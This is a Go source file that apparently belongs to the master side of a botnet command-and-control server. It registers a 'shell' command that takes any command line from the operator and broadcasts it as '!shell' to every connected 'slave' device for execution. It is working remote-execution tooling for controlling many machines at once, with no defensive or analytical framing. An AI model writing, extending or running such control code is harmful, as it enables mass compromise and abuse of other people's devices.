package all

import (
	"server/core/master/command"
	"server/core/master/session/sessions"
	"server/core/slaves/slave"
)

func init() {
	command.Make(&command.Command{
		Aliases:     []string{"shell", "cmd"},
		Description: "Shell cmd.",
		Admin:       false,
		Executor: func(args []string, session *sessions.Session) {
			if len(args) < 1 {
				session.Println("Usage: shell <command>")
				session.Println("Example: shell echo test")
				return
			}
			var msg string
			for i := 0; i < len(args); i++ {
				msg += args[i] + " "
			}
			slave.List.Command("!shell " + msg)
			session.Println("Broadcasted command to all devices.")
		},
	})
}
